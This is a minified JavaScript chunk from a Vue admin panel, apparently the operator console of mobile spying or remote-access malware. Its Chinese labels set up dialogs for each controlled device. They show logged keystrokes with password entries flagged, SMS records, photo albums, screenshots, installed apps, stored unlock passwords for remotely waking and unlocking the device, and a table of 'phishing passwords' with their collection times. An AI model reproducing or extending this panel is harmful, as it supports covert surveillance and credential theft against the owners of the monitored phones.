,8,["onClick","loading"])])])]),G((s(),f("div",Te,[(s(!0),f(P,null,_(e.inputLogList,(l,n)=>(s(),f("div",{class:Q(["log-item",{"password-item":l.password==1}]),key:n},[o("div",Re,[o("span",Me,k(l.date||e.formatTime(l.time)),1),o("span",{class:Q(["log-source",{"source-admin":l.source==1,"source-app":l.source==0}])},k(l.source==1?"\u7BA1\u7406\u7AEF":"App\u7AEF"),3),o("span",Ye,k(l.app),1),l.resourceId?(s(),f("span",Ne,k(l.resourceId),1)):g("v-if",!0),o("span",Oe,k(l.text||(l.password==1?"[\u5BC6\u7801\u8F93\u5165]":"\u65E0\u5185\u5BB9")),1)])],2))),128)),e.inputLogList.length===0&&!e.logLoading?(s(),f("div",He,"\u6682\u65E0\u8F93\u5165\u65E5\u5FD7\u6570\u636E")):g("v-if",!0)])),[[x,e.logLoading]])]),_:1},8,["modelValue","title"]),g(" \u5B89\u88C5\u5E94\u7528\u5F39\u7A97 "),a(V,{modelValue:e.appListVisible,"onUpdate:modelValue":t[18]||(t[18]=l=>e.appListVisible=l),title:`\u5B89\u88C5\u5E94\u7528\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAppDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(H,{"device-id":e.currentAppDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),g(" \u9009\u62E9\u89E3\u9501\u5BC6\u7801\u5F39\u7A97 "),a(V,{modelValue:e.unlockDialogVisible,"onUpdate:modelValue":t[21]||(t[21]=l=>e.unlockDialogVisible=l),title:`\u9009\u62E9\u89E3\u9501\u5BC6\u7801 - \u8BBE\u5907ID: ${((T=e.currentWakeRow)==null?void 0:T.deviceId)||""}`,width:"480px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[20]||(t[20]=l=>e.unlockDialogVisible=!1)},{default:i(()=>t[58]||(t[58]=[d("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.confirmWakeup,loading:e.unlocking,disabled:!e.selectedUnlockId},{default:i(()=>t[59]||(t[59]=[d("\u786E\u5B9A")])),_:1},8,["onClick","loading","disabled"])]),default:i(()=>[o("div",null,[a(U,{"label-width":"90px"},{default:i(()=>[a(v,{label:"\u89E3\u9501\u5BC6\u7801"},{default:i(()=>[a(A,{modelValue:e.selectedUnlockId,"onUpdate:modelValue":t[19]||(t[19]=l=>e.selectedUnlockId=l),placeholder:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",filterable:"",style:{width:"100%"}},{default:i(()=>[(s(!0),f(P,null,_(e.unlockOptions,l=>(s(),C(E,{key:l.id,label:e.formatUnlockTips(l),value:l.id},{default:i(()=>[o("span",We,k(e.formatUnlockTips(l)),1),o("span",je,[o("span",Ke,k(l.createDate),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1})])]),_:1},8,["modelValue","title"]),g(" \u77ED\u4FE1\u8BB0\u5F55\u5F39\u7A97 "),a(V,{modelValue:e.smsListVisible,"onUpdate:modelValue":t[22]||(t[22]=l=>e.smsListVisible=l),title:`\u77ED\u4FE1\u8BB0\u5F55 - \u8BBE\u5907ID: ${e.currentSmsDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(W,{"device-id":e.currentSmsDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),g(" \u76F8\u518C\u5217\u8868\u5F39\u7A97 "),a(V,{modelValue:e.albumListVisible,"onUpdate:modelValue":t[23]||(t[23]=l=>e.albumListVisible=l),title:`\u76F8\u518C\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAlbumDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(j,{"device-id":e.currentAlbumDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),g(" \u622A\u56FE\u5217\u8868\u5F39\u7A97 "),a(V,{modelValue:e.snapshotListVisible,"onUpdate:modelValue":t[24]||(t[24]=l=>e.snapshotListVisible=l),title:`\u622A\u56FE\u5217\u8868 - \u8BBE\u5907ID: ${e.currentSnapshotDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(K,{"device-id":e.currentSnapshotDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),g(" \u5907\u6CE8\u5F39\u7A97 "),a(V,{modelValue:e.remarkDialogVisible,"onUpdate:modelValue":t[27]||(t[27]=l=>e.remarkDialogVisible=l),title:`\u8BBE\u5907\u5907\u6CE8 - \u8BBE\u5907ID: ${e.currentRemarkDevice.deviceId}`,width:"500px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[26]||(t[26]=l=>e.remarkDialogVisible=!1)},{default:i(()=>t[60]||(t[60]=[d("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.submitRemark,loading:e.remarkSubmitting},{default:i(()=>t[61]||(t[61]=[d("\u786E\u5B9A")])),_:1},8,["onClick","loading"])]),default:i(()=>[a(U,{"label-width":"80px"},{default:i(()=>[a(v,{label:"\u5907\u6CE8\u5185\u5BB9"},{default:i(()=>[a(F,{modelValue:e.remarkContent,"onUpdate:modelValue":t[25]||(t[25]=l=>e.remarkContent=l),type:"textarea",rows:4,placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8\u5185\u5BB9",clearable:""},null,8,["modelValue"])]),_:1})]),_:1})]),_:1},8,["modelValue","title"]),g(" \u67E5\u770B\u9493\u9C7C\u5BC6\u7801\u5F39\u7A97 "),a(V,{modelValue:e.fishPwdDialogVisible,"onUpdate:modelValue":t[29]||(t[29]=l=>e.fishPwdDialogVisible=l),title:`\u9493\u9C7C\u5BC6\u7801 - ${e.fishPwdTitle}`,width:"700px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[28]||(t[28]=l=>e.fishPwdDialogVisible=!1)},{default:i(()=>t[62]||(t[62]=[d("\u5173\u95ED")])),_:1})]),default:i(()=>[G((s(),f("div",null,[a(z,{data:e.fishPwdList,border:"",style:{width:"100%"}},{default:i(()=>[a(w,{prop:"data",label:"\u5BC6\u7801","header-align":"center",align:"center","show-overflow-tooltip":""}),a(w,{prop:"created",label:"\u91C7\u96C6\u65F6\u95F4","header-align":"center",align:"center",width:"180px"})]),_:1},8,["data"]),e.fishPwdList.length===0&&!e.fishPwdLoading?(s(),f("div",Ge,"\u6682\u65E0\u6570\u636E")):g("v-if",!0)])),[[x,e.fishPwdLoading]])]),_:1},8,["modelValue","title"])])}var st=Z(pe,[["render",Je],["__scopeId","data-v-16c9950d"],["__file","/Users/luochen/project17/taie-sword/taie-admin-vue/src/views/device/list.vue"]]);export{st as default};
